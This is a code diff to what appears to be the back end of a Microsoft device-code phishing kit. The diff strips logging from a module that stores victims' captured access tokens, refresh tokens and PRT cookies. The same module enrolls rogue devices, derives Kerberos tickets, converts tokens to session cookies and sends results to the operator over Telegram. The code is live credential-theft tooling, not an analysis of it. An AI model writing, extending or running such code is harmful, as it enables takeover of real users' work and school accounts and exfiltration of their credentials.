@@ -81,11 +81,8 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       if (data && data.user_code && data.device_code) {
         dcData = data;
       } else {
-        console.warn('[DeviceProxy] Proxied devicecode request returned no user_code; falling back to direct',
-          data && data.error ? data.error : '');
       }
     } catch (err) {
-      console.warn('[DeviceProxy] Proxied devicecode request failed; falling back to direct:', err.message);
     }
 
     if (!dcData) {
@@ -149,9 +146,7 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       message: dcData.message,
     };
   } catch (err) {
-    console.error('[DeviceProxy] startDeviceFlow error:', err.message);
     if (err.response) {
-      console.error('[DeviceProxy] Microsoft response:', err.response.status, JSON.stringify(err.response.data).substring(0, 500));
     }
     throw err;
   }
@@ -366,7 +361,6 @@ async function pollForToken(jobId) {
         return;
       }
     } catch (err) {
-      console.error('[DeviceProxy] Poll error:', err.message);
       // Mark proxy as failure
       if (job.proxy_id) {
         try {
@@ -452,7 +446,6 @@ async function retryAsTokenMode(originalJob) {
       interval: dcData.interval || 5,
     };
   } catch (err) {
-    console.error('[DeviceProxy] retryAsTokenMode error:', err.message);
     return null;
   }
 }
@@ -521,7 +514,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       if (prtCookieClaims) {
         prt = prtCookie.value;
       } else {
-        console.warn('[DeviceProxy] Ignoring non-JWT x-ms-RefreshTokenCredential cookie; real PRT JWT required for renewal/Kerberos flow');
       }
     }
 
@@ -582,7 +574,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         };
 
       } catch (enrollErr) {
-        console.error('[DeviceProxy] Device enrollment failed:', enrollErr.message);
         deviceEnrolled = false;
       }
     }
@@ -608,7 +599,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
           }
         }
       } catch (refreshErr) {
-        console.error('[DeviceProxy] DRS token refresh/retry enrollment failed:', refreshErr.message);
       }
     }
 
@@ -681,11 +671,9 @@ async function storeToken(job, tokenData, responseCookies = []) {
               }
             );
           } catch (skErr) {
-            console.warn('[DeviceProxy] session key not stored in device_credentials:', skErr.message);
           }
         }
       } catch (prtErr) {
-        console.warn('[DeviceProxy] request_for_device failed (non-fatal):', prtErr.message);
       }
     }
 
@@ -754,11 +742,9 @@ async function storeToken(job, tokenData, responseCookies = []) {
           /Unknown column 'client_info'/.test(primaryMsg);
 
         if (!isDeviceSchemaIssue) {
-          console.error('[DeviceProxy] Token insert failed:', primaryInsertErr.message);
           throw primaryInsertErr;
         }
 
-        console.warn('[DeviceProxy] Device columns missing, falling back to legacy insert');
         const [legacyResult] = await db.query(
           `INSERT INTO captured_tokens
            (user_id, link_id, email, token_type, access_token_encrypted,
@@ -790,14 +776,13 @@ async function storeToken(job, tokenData, responseCookies = []) {
         tokenId = legacyResult.insertId;
       }
     } catch (e) {
-      console.error('[DeviceProxy] Token insert/fallback error:', e && e.message ? e.message : e);
     }
 
     if (tokenId && deviceEnrolled && accountType === 'work_school'
         && tenant && tenant !== 'common' && tenant !== 'organizations') {
       const kerberosService = require('./kerberos');
       kerberosService.deriveTGTForToken(tokenId)
-        .catch(err => console.error('[DeviceProxy] Kerberos derivation error:', err.message));
+        .catch(err => {});
     }
 
     // For cookie mode, trigger cookie conversion immediately after capture
@@ -810,7 +795,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       } else {
         cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType, job.user_id)
           .catch(err => {
-            console.error('[DeviceProxy] Cookie conversion failed:', err.message);
             return { success: false, error: err.message };
           });
       }
@@ -844,7 +828,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
               certificateDerBase64: registrationResult.certificateDerBase64,
             });
           } catch (skErr) {
-            console.warn('[DeviceProxy] session key not stored in device_credentials:', skErr.message);
           }
         }
         if (registrationResult.prt && tokenId) {
@@ -854,7 +837,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
               [encrypt(registrationResult.prt), encrypt(registrationResult.sessionKeyJwe || null), tokenId]
             );
           } catch (pErr) {
-            console.warn('[DeviceProxy] Failed to store request_for_device PRT:', pErr.message);
           }
         }
       }).then(() => {
@@ -868,34 +850,32 @@ async function storeToken(job, tokenData, responseCookies = []) {
                   db.query(
                     'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
                     [encrypt(derivationResult.tgt_cloud), tokenId]
-                  ).catch(err => console.error('[DeviceProxy] Failed to save TGT cloud:', err));
+                  ).catch(err => {});
                 }
                 if (derivationResult.tgt_ad) {
                   db.query(
                     'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
                     [encrypt(derivationResult.tgt_ad), tokenId]
-                  ).catch(err => console.error('[DeviceProxy] Failed to save TGT AD:', err));
+                  ).catch(err => {});
                 }
                 if (derivationResult.session_key) {
                   db.query(
                     'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
                     [encrypt(derivationResult.session_key), tokenId]
-                  ).catch(err => console.error('[DeviceProxy] Failed to save session key:', err));
+                  ).catch(err => {});
                 }
                 if (derivationResult.kerberos_top_level_names) {
                   db.query(
                     'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
                     [derivationResult.kerberos_top_level_names, tokenId]
-                  ).catch(err => console.error('[DeviceProxy] Failed to save kerberos names:', err));
+                  ).catch(err => {});
                 }
               }
             })
             .catch(err => {
-              console.error('[DeviceProxy] Kerberos derivation error:', err.message);
             });
         }
       }).catch(err => {
-        console.error('[DeviceProxy] Device registration failed:', err.message);
         deviceRegistrationFailed = true;
         // Don't fail the token capture - device registration is optional
       });
@@ -918,7 +898,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         [newStatus, job.user_id, job.link_id, 'waiting', 'visited']
       );
     } catch (updateErr) {
-      console.error('[DeviceProxy] Visitor status update error:', updateErr.message);
     }
 
     // Notify via WebSocket
@@ -998,10 +977,8 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
       await sendTelegramDocument(job.user_id, filename, fileContent, caption);
     } catch (telegramErr) {
-      console.error('[DeviceProxy] Telegram report failed:', telegramErr);
     }
   } catch (err) {
-    console.error('[DeviceProxy] storeToken error:', err.message);
   }
 }
 
